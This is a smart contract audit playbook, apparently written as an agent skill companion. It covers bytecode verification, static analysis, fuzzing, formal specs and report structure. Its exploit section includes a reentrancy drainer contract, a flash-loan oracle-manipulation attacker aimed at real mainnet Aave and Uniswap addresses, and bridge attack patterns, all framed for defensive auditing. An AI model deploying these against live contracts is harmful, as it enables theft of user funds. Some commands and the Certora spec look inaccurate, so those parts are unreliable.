# Smart Contract Audit Playbook — End-to-End Workflow Guide

> Deep-dive companion to `skills/blockchain-web3/SKILL.md`.
>
> Audience: auditors and security engineers who know what Slither, Mythril, and Foundry do, and want a battle-tested playbook for taking a smart contract from raw source to a defensible audit report — without missing the bug that drains the protocol.

---

## 1. Why a Workflow, Not Just Commands

`slither .` produces a finding list in 30 seconds. The trap is treating that finding list as the audit. A defensible audit requires:

1. **Source verification** — is the deployed bytecode actually what you're reading?
2. **Coverage** — did you exercise every external/public function with meaningful inputs?
3. **Property testing** — did you state the invariants and try to break them?
4. **Exploitability** — did you turn each HIGH finding into a concrete PoC?
5. **Economic realism** — did you check whether the bug is exploitable under flash loans, MEV, and adversarial mempool conditions?
6. **Defense validation** — did you verify the recommended fix actually closes the bug?

This guide walks through all six, in order, with the exact commands and decision points.

---

## 2. Pre-Flight: Scope & Authorization

Before any analysis, answer these — in writing:

- **What's in scope?** Repo paths, contract addresses, chain IDs. Out-of-scope paths (e.g., dependencies under `lib/`) should be listed explicitly.
- **What's the deployment state?** Pre-deploy (source-only)? Deployed on testnet? Deployed on mainnet? Each requires different verification steps.
- **What's the threat model?** Random attacker? Privileged insider? Compromised multisig signer? Each yields a different finding priority.
- **What's the deliverable?** Internal report? Public bug bounty submission? Code4rena/Cantina competitive audit? Different deliverables have different severity rubrics and disclosure timelines.
- **What's the timeline?** A 2-day triage audit finds different bugs than a 6-week competitive audit. Set expectations.

If any of these are unclear, stop and resolve before proceeding.

---

## 3. Pre-Audit Checklist: Source vs Deployed Bytecode

A verified Etherscan source is **not** proof that the deployed bytecode matches the verified source. Half of all "post-incident surprises" were unverified contracts, drifted contracts, or proxy implementations that were silently swapped.

### 3.1 Diff compiled source against on-chain runtime

```bash
# 1. Pull the deployed runtime bytecode
cast code 0xTarget --rpc-url $RPC > deployed_runtime.hex

# 2. Compile the source with the same compiler + optimizer settings as deployed
#    (check Etherscan's metadata for solc version + optimizer runs)
solc-select install 0.8.24 && solc-select use 0.8.24
forge inspect src/Vault.sol:Vault irOptimized --optimizer-runs 200 \
  | jq -r '.bytecode.object' > compiled_runtime.hex

# 3. Diff — any difference is a finding
diff deployed_runtime.hex compiled_runtime.hex
# Empty diff: source matches deployed (proceed)
# Non-empty diff: source ≠ deployed (STOP — re-derive or refuse to audit)
```

### 3.2 Sourcify as a second source

Etherscan verification is centralized and spoofable in some edge cases. Sourcify is decentralized and produces a content-addressed match.

```bash
# Check if a Sourcify full-match exists
curl "https://repo.sourcify.dev/contracts/full_match/1/0xTarget/metadata.json" | jq

# If empty: no Sourcify match. Deploy with:
forge verify-contract 0xTarget src/Vault.sol:Vault \
  --verifier sourcify --chain-id 1
```

### 3.3 Proxy vs implementation

For upgradeable contracts, the on-chain `code` is the proxy's. Verify the implementation separately:

```bash
# EIP-1967 implementation slot
cast storage 0xProxy 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc \
  --rpc-url $RPC

# Or use OpenZeppelin's helper
cast call 0xProxy "implementation()" --rpc-url $RPC  # for transparent proxies

# Then diff the implementation's bytecode (repeat §3.1 against the impl address)
```

### 3.4 Decision point

If source ≠ deployed, **do not proceed with the audit**. Report the drift to the protocol team; auditing the wrong code wastes everyone's time and exposes the auditor to liability.

---

## 4. Phase 1 — Recon & Threat Modeling

### 4.1 Read the docs first

Before any tooling, read (in order):
1. The README — what does the protocol *claim* to do?
2. The whitepaper (if any) — what is the economic design?
3. Prior audit reports — what was already found? Don't re-report a known issue.
4. The protocol's Twitter/Discord — any known incidents?

### 4.2 Build the dependency graph

```bash
# Slither's inheritance graph
slither . --print inheritance-graph > inheritance.dot
dot -Tpng inheritance.dot -o inheritance.png

# Slither's call graph
slither . --print call-graph > callgraph.dot
dot -Tpng callgraph.dot -o callgraph.png

# External contracts called
slither . --print human-summary | grep -A20 "external"
```

### 4.3 Identify the trusted boundary

For every external call, ask: *who controls the callee?*
- Trusted: OpenZeppelin, Uniswap V3 Core, Chainlink — audited, immutable on mainnet.
- Semi-trusted: a token listed on a vetted DEX — code is usually standard ERC20, but can have fee-on-transfer or rebasing surprises.
- Untrusted: any user-supplied address (especially `token`, `recipient`, `path[0]`, `to`).

Treat every untrusted callee as hostile. Wrap it in a reentrancy guard. Don't trust return values without validation.

---

## 5. Phase 2 — Static Analysis

### 5.1 Slither detector mapping to SWC IDs

Run Slither with all detectors, then triage by SWC ID.

```bash
slither . --filter-paths "lib|test|script|mocks" --json slither.json

# HIGH and CRITICAL findings, grouped by SWC ID
jq '.results.detectors[] |
    select(.impact == "High" or .impact == "Medium") |
    {check, impact, first_slot, description}' slither.json \
  | jq -s 'group_by(.check) | map({check: .[0].check, count: length, ids: map(.first_slot)})'
```

**Detector → SWC ID → bug class** (the 12 you'll see most):

| Slither Detector | SWC ID | Bug Class |
|------------------|--------|-----------|
| `reentrancy-eth`, `reentrancy-no-eth`, `reentrancy-unlimited-gas` | SWC-107 | Reentrancy |
| `arithmetic` (tx-dependent) | SWC-101 | Integer Overflow/Underflow |
| `tx-origin` | SWC-115 | Authorization via tx.origin |
| `unchecked-transfer`, `unchecked-lowlevel`, `unchecked-send` | SWC-104 | Unchecked return value |
| `timestamp`, `block-height` | SWC-116 | Block state as randomness/source |
| `assembly` | SWC-102 | Inline assembly (out of scope for tools) |
| `suicidal` | SWC-106 | Unprotected selfdestruct |
| `uninitialized-state-variable`, `uninitialized-storage` | SWC-109 | Uninitialized storage pointer |
| `locked-ether` | SWC-132 | Ether locked in contract |
| `arbitrary-send`, `arbitrary-send-erc20` | SWC-105 | Unauthenticated ether/token send |
| `shadowing-local`, `shadowing-state` | SWC-119 | State variable shadowing |
| `delegatecall-loop`, `controlled-delegatecall` | SWC-112 | Dangerous delegatecall |

### 5.2 Mythril modes

Mythril has three execution backends with different trade-offs:

| Mode | Flag | Speed | Coverage | When to Use |
|------|------|-------|----------|-------------|
| Quick | `--execution-timeout 60 --max-depth 10` | Seconds | Shallow | First triage, every contract |
| Default (symbolic) | `--execution-timeout 600 --max-depth 50` | Minutes | Medium | Detailed review of suspicious functions |
| BMC | `--backend bmc --execution-timeout 600` | Minutes | Complementary | Catch what symbolic execution misses |

```bash
# Quick pass on every contract
for sol in src/*.sol; do
  myth analyze "$sol" --execution-timeout 60 --max-depth 10 -o json \
    > "mythril_$(basename $sol .sol).json"
done

# Deep pass on the 1-2 contracts with the most external calls
myth analyze src/Vault.sol \
  --execution-timeout 1800 \
  --max-depth 100 \
  --modules arithmetic,ether_thief,transaction_order_independence,reentrancy \
  --verbose 2>&1 | tee mythril_vault_trace.log
```

### 5.3 When Mythril finds nothing

Don't conclude "no bug." Mythril's coverage is limited by depth and timeout. Always cross-check with Slither + manual review + fuzzing.

---

## 6. Phase 3 — Dynamic Testing

### 6.1 Forge test with traces

```bash
# Run the project's test suite at max verbosity (-vvvv = full stack traces)
forge test -vvvv

# Focus on a specific contract
forge test --match-contract VaultTest -vvvv

# Run a single test
forge test --match-test testWithdraw -vvvv

# Skip slow tests
forge test --no-match-test testFork -vvv
```

### 6.2 Read state without deploying

```bash
# Function call (view)
cast call 0xVault "totalAssets()" --rpc-url $RPC
cast call 0xVault "balanceOf(address)" 0xAlice --rpc-url $RPC

# Raw storage slot read
cast storage 0xVault 0 --rpc-url $RPC   # slot 0
cast storage 0xVault 1 --rpc-url $RPC   # slot 1

# Decode storage layout (needs the storage layout JSON)
forge inspect src/Vault.sol:Vault storage-layout | jq
```

### 6.3 Coverage

```bash
forge coverage --report lcov
genhtml lcov.info -o coverage_html
open coverage_html/index.html

# Functions with 0% coverage — these are the audit's blind spots
lcov --extract lcov.info 'src/**' | grep 'FNDA:0,'
```

---

## 7. Phase 4 — Fuzzing & Property Testing

### 7.1 Foundry fuzzing strategy

Foundry fuzzers have two modes:

| Mode | Test Function Signature | What It Does |
|------|-------------------------|--------------|
| **Stateless fuzz** | `testFuzz_Foo(uint256 x)` | Each call is independent — fuzzer generates random inputs per call |
| **Stateful fuzz (invariant)** | `invariant_Bar()` | Fuzzer runs random sequences of handler calls, asserts the invariant after each |

```bash
# Stateless — 10k runs per test
forge config set fuzz.runs 10000
forge test --match-test testFuzz -vvv

# Stateful — 256 runs × 500 depth = 128k calls
forge config set invariant.runs 256
forge config set invariant.depth 500
forge test --match-test invariant_ -vvv
```

### 7.2 Echidna invariants

Echidna complements Foundry with coverage-guided mutation. Use both — they catch different bugs.

```bash
# Write invariants as functions returning bool (true = property holds)
# in echidna/VaultEchidna.sol

# Configure via YAML for reproducibility
cat <<EOF > echidna.yaml
testMode: property
testLimit: 1000000
seqLen: 10
workers: 4
corpusDir: corpus/
sender: ["0x10000", "0x20000", "0x30000", "0x40000"]
EOF

echidna-test echidna/VaultEchidna.sol \
  --contract VaultEchidna \
  --config echidna.yaml 2>&1 | tee echidna.log

# If a counterexample is found:
# 1. Echidna prints the call sequence — copy it
# 2. Translate each call into a forge test
# 3. Run the forge test to confirm the counterexample reproduces
# 4. Add the sequence to corpus/ for future mutation runs
```

### 7.3 Certora for the highest-stakes properties

For properties that *must* hold (e.g., total deposits ≥ sum of withdrawable balances), fuzzing is not enough — use Certora for mathematical proof.

```cvl
// specs/Vault.spec
method deposit(uint256 amount) envfree;
method withdraw(uint256 amount) envfree;

rule noNegativeBalance(method f, calldataarg args) {
    uint256 before = balances[msg.sender];
    env e;
    f(e, args);
    uint256 after_ = balances[msg.sender];
    assert after_ >= 0 || after_ <= before,
        "balance went negative via underflow";
}

invariant totalDepositsNonNegative()
    totalDeposits >= 0;

invariant accountingConsistent()
    sum(balances) == totalDeposits;
```

```bash
certoraRun src/Vault.sol \
  --verify Vault:specs/Vault.spec \
  --rule noNegativeBalance \
  --msg "vault: no underflow"
```

---

## 8. Phase 5 — Exploit PoC

### 8.1 Mainnet fork strategy

```bash
# Pin the block number for reproducibility
export FORK_BLOCK=19000000

# Anvil fork
anvil --fork-url $MAINNET_RPC --fork-block-number $FORK_BLOCK --port 8545 &

# Verify the fork
cast block-number --rpc-url http://localhost:8545  # should echo $FORK_BLOCK
cast chain-id --rpc-url http://localhost:8545      # should echo 1

# Run the PoC test against the fork
forge test --match-test test_PoC_ \
  --fork-url http://localhost:8545 \
  --fork-block-number $FORK_BLOCK \
  -vvvv 2>&1 | tee evidence/poc.log
```

**Choosing the block number**:
- For a known incident: use the block just *before* the exploit tx.
- For a pre-deploy audit: use the latest block, or a recent block with high liquidity.
- For an upgrade audit: use the block at which the upgrade is planned.

### 8.2 Reentrancy PoC template

```solidity
// test/ReentrancyPoC.t.sol
pragma solidity ^0.8.24;
import "forge-std/Test.sol";

interface IVault {
    function deposit() external payable;
    function withdraw() external;
    function balances(address) external view returns (uint256);
}

contract Attacker {
    IVault public vault;
    uint256 public drainCount;

    constructor(address _vault) {
        vault = IVault(payable(_vault));
    }

    function pwn() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        drainCount++;
        if (address(vault).balance >= 1 ether && drainCount < 100) {
            vault.withdraw();
        }
    }
}

contract ReentrancyPoCTest is Test {
    function test_PoC_DrainViaReentrancy() public {
        // Deploy the vulnerable vault (or use the fork)
        IVault vault = IVault(deployCode("Vault.sol"));
        vm.deal(address(vault), 0);

        // Fund the vault with some victim deposits
        address victim1 = makeAddr("victim1");
        vm.deal(victim1, 10 ether);
        vm.prank(victim1);
        vault.deposit{value: 10 ether}();

        // Deploy attacker with 1 ether
        Attacker attacker = new Attacker(address(vault));
        vm.deal(address(attacker), 1 ether);

        uint256 vaultBalBefore = address(vault).balance;
        attacker.pwn{value: 1 ether}();

        assertEq(address(vault).balance, 0, "vault not drained");
        assertGt(address(attacker).balance, 0, "attacker no profit");
        console.log("Vault drained of", vaultBalBefore, "wei");
    }
}
```

### 8.3 Flash loan PoC template (price oracle manipulation)

```solidity
// test/FlashLoanPoC.t.sol
pragma solidity ^0.8.24;
import "forge-std/Test.sol";

interface IAavePool {
    function flashLoan(
        address receiver,
        address[] calldata assets,
        uint256[] calldata amounts,
        bytes calldata params
    ) external;
}

interface IUniswapV2Pair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112, uint112, uint32);
}

interface IVictim {
    function getAssetPrice() external view returns (uint256);
    function borrow(uint256 amount) external;
}

contract FlashLoanOracleAttacker {
    IAavePool public constant AAVE = IAavePool(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    IUniswapV2Pair public pair;
    IVictim public victim;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    constructor(address _pair, address _victim) {
        pair = IUniswapV2Pair(_pair);
        victim = IVictim(_victim);
    }

    function attack() external {
        address[] memory assets = new address[](1);
        assets[0] = WETH;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 100_000 ether;
        AAVE.flashLoan(address(this), assets, amounts, "");
    }

    function executeOperation(
        address[] calldata, uint256[] calldata amounts,
        uint256[] calldata premiums, address, bytes calldata
    ) external returns (bool) {
        // 1. Manipulate the spot price
        uint256 wethToDump = 50_000 ether;
        IERC20(WETH).transfer(address(pair), wethToDump);
        pair.swap(0, 25_000_000 ether, address(this), "");

        // 2. Confirm the manipulated price
        uint256 manipulatedPrice = victim.getAssetPrice();
        console.log("Manipulated price:", manipulatedPrice);

        // 3. Exploit the victim
        victim.borrow(5_000_000 ether);

        // 4. Reverse the price (sell the other side back)
        // ... (sell 25M DAI for WETH, restore pair reserves)

        // 5. Repay Aave
        uint256 amountToReturn = amounts[0] + premiums[0];
        IERC20(WETH).approve(address(AAVE), amountToReturn);

        return true;
    }
}

contract FlashLoanPoCTest is Test {
    function test_PoC_FlashLoanOracle() public {
        // Fork setup (requires fork-url + fork-block-number)
        address pair = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc; // WETH/USDC
        address victim = 0xTarget; // the protocol under audit

        FlashLoanOracleAttacker attacker =
            new FlashLoanOracleAttacker(pair, victim);
        attacker.attack();

        // Assertions: victim lost funds, attacker profited
        // ...
    }
}
```

### 8.4 Bridge attack patterns

Two recurring bridge bug classes:

**Pattern A — Signature replay across chains** (Wormhole-style):

```solidity
// VULNERABLE: hash does not include destination chain ID
bytes32 h = keccak256(abi.encode(recipient, amount, sourceChainId));
require(!processed[h], "already processed");
require(verifySigs(h, sigs), "bad sigs");
processed[h] = true;

// ATTACK: a message validly signed for Ethereum mainnet (chainId=1) can be
// replayed on every chain that trusts the same validator set, because
// processed[h] is per-chain, not global.
//
// FIX: include BOTH chain IDs in the hash:
// bytes32 h = keccak256(abi.encode(sourceChainId, destChainId, nonce, recipient, amount));
```

**Pattern B — Validator set swap with no timelock** (Ronin-style):

```solidity
// VULNERABLE: validator set can be swapped in the same tx as the malicious message
function setValidators(address[] calldata newValidators) external onlyGovernance {
    validators = newValidators;
}

// ATTACK: governance key compromised → setValidators([attacker]) → release(anything)
//
// FIX: every validator set change must sit in a timelock for >= 24h
```

---

## 9. Phase 6 — Audit Report

### 9.1 Severity rubric

| Severity | Criteria | Examples |
|----------|----------|----------|
| **CRITICAL** | Direct, unconditional loss of funds. Bypass of all auth. | Reentrancy draining vault; anyone-callable `selfdestruct`; flash-loan-drainable protocol |
| **HIGH** | Loss of funds under specific but likely conditions. Auth bypass with constraints. | Missing `onlyOwner`; oracle manipulable but only with $50M+ flash loan |
| **MEDIUM** | Loss of funds under unlikely conditions. Functional bug. | Sandwich-able swap without slippage protection; rounding exploit off by 1 wei per tx |
| **LOW** | Minor logic issue. Defense-in-depth recommendation. | Missing event emission; `nonReentrant` not applied even though CEI is followed |
| **INFORMATIONAL** | Style, gas optimization, code quality. | Gas refund opportunities; NatSpec gaps |

### 9.2 Finding structure (per finding)

```markdown
### [SEVERITY] Title

**Severity**: SEVERITY
**SWC ID**: SWC-### (if applicable)
**Location**: src/Contract.sol:L##-L##

**Description**:
1-2 paragraphs explaining the bug. Be specific: what function, what state, what
input triggers it.

**Impact**:
Quantify. "$X drainable", "$X stuck", "100% of users affected". For mainnet
deployments, use the current TVL. For pre-deploy, use the projected TVL.

**Proof of Concept**:
File: `test/PoC.t.sol::test_PoC_...`

\`\`\`bash
forge test --match-test test_PoC_... \
  --fork-url http://localhost:8545 \
  --fork-block-number 19000000 -vvvv
\`\`\`

**Recommendation**:
1. Concrete fix #1 (e.g., apply CEI).
2. Concrete fix #2 (e.g., inherit ReentrancyGuard).
3. Regression test to add (e.g., `invariant_VaultBalanceMatchesAccounting`).

**Status**: Fix pending / fixed in commit abc123 / acknowledged as won't-fix.
```

### 9.3 Report assembly

```markdown
# Audit Report: <Protocol>
**Date**: 2026-06-16
**Auditor**: kali-claw
**Scope**: src/**/*.sol (N contracts, N LOC)
**Methodology**: Slither, Mythril, manual review, Foundry fuzzing, Echidna, Certora
**Timeline**: 2 weeks

## Executive Summary
- Critical: N
- High: N
- Medium: N
- Low: N
- Informational: N

## Scope
[List of contracts, paths, addresses]

## Methodology
[Tools used, fuzzing run counts, formal verification rules]

## Findings
[Each finding in §9.2 format, sorted CRITICAL → INFORMATIONAL]

## Out of Scope
[Dependencies, helper scripts, frontend code — explicit]

## Appendix A: Slither Raw Output
[Optional: link to JSON]

## Appendix B: Mythril Raw Output
[Optional: link to JSON]

## Appendix C: Test Coverage Report
[forge coverage summary]
```

---

## 10. Integration with Adjacent Skills

### 10.1 `api-security` for dApp backends

Most DeFi protocols have a REST/GraphQL API in front of the contracts (for indexing, user state, signature generation). The API is the second attack surface:

- Run `api-security` payloads against the dApp's backend — BOLA on user portfolios, mass-assignment on profile settings, JWT confusion on session tokens.
- A common pattern: the API signs transactions on behalf of the user. Test that the signing server validates the calldata — otherwise an XSS in the frontend becomes a drain vector.

### 10.2 `exploit-development` for PoC writing

The rigor of writing a binary exploit (precise crash input, minimal repro case, deterministic trigger) transfers directly to writing a smart contract PoC:
- Minimize the call sequence — every extra call obscures the root cause.
- Pin the block number — fork state must be deterministic for the PoC to reproduce.
- Assert the *post-condition* (vault drained), not the *absence of revert* — a passing PoC that doesn't move funds proves nothing.

### 10.3 `repo-scan` for source-code review

Before reading line-by-line, run `repo-scan` for the highest-signal lint findings:
- Secret scanning (RPC URLs with embedded keys, deployer mnemonics in tests).
- Dependency review (pinned versions? audited?).
- CI configuration (is Slither running on every PR?).

### 10.4 `pentest-reporting` for the deliverable

The audit report is the deliverable. `pentest-reporting` covers executive summaries, risk rating methodologies, and remediation tracking — all directly applicable to a Web3 audit report. Use the same severity definitions and the same "fix verified" workflow.

### 10.5 `web-auth-bypass` for the dApp frontend

The dApp frontend authenticates users via wallet signatures (SIWE — Sign-In with Ethereum). Test:
- Signature replay — can a signed message from session A be reused in session B?
- Message format — does the server verify the exact message structure, or just the signature?
- Cross-origin — can a malicious site request a SIWE signature and replay it to the legit backend?

---

## 11. Post-Audit: Continuous Verification

The audit is a snapshot, not a permanent stamp. After delivery:

1. **CI integration** — Slither, Mythril, Foundry invariants, and Solhint must run on every PR.
2. **Bug bounty** — list on Immunefi with a $1M+ cap for critical findings on mainnet deployments.
3. **Monitoring** — Forta Network bots watching for anomalous function calls (large `withdraw`, unusual `delegatecall`, etc.).
4. **Incident response plan** — pauseable contracts, a war-room multisig, and a pre-drafted post-mortem template. Practice the runbook before you need it.
5. **Re-audit on every upgrade** — proxy upgrades invalidate the prior audit for the changed code paths. Always re-audit.

---

## 12. Common Pitfalls

| Pitfall | Why It Happens | Mitigation |
|---------|----------------|------------|
| **Auditing the wrong code** | Etherscan-verified source drifted from deployed bytecode | Always diff `cast code` vs `forge inspect` (§3.1) |
| **Missing the cross-contract reentrancy** | Slither flags single-contract reentrancy, but cross-contract reentrancy is harder | Manually trace every external call to an untrusted callee |
| **Treating a passing fuzz run as proof of safety** | 10k fuzz runs < 1 second of adversarial mempool attention | Layer Echidna + Certora for high-stakes properties |
| **Forgetting the proxy implementation** | Audit the proxy, miss that the implementation can be swapped | Audit both proxy and implementation separately; check the upgrade authorization path |
| **Underestimating flash loan impact** | "An attacker would need $100M" — they can borrow it | Assume attackers have unlimited capital for one block |
| **Missing the governance attack** | Vote delegation, quorum manipulation, flash-loan-voted proposals | Audit the governance contract with the same rigor as the vault |
| **Ignoring the multisig signer set** | "It's a 3-of-5, that's fine" — until 3 signers share one laptop | Review signer operational independence, not just the on-chain threshold |
| **Skipping the post-mortem step** | After the fix, no regression test is added | Always add the exploit PoC as a CI test (must fail on the patched code) |

---

**Related files**: `SKILL.md`, `payloads.md`, `test-cases.md`
**SWC Registry**: [swcregistry.io](https://swcregistry.io)
**Foundry book**: [book.getfoundry.sh](https://book.getfoundry.sh)
**Certora docs**: [docs.certora.com](https://docs.certora.com)
**Ethernaut (wargame)**: [ethernaut.openzeppelin.com](https://ethernaut.openzeppelin.com)
**Damn Vulnerable DeFi**: [damnvulnerabledefi.xyz](https://damnvulnerabledefi.xyz)
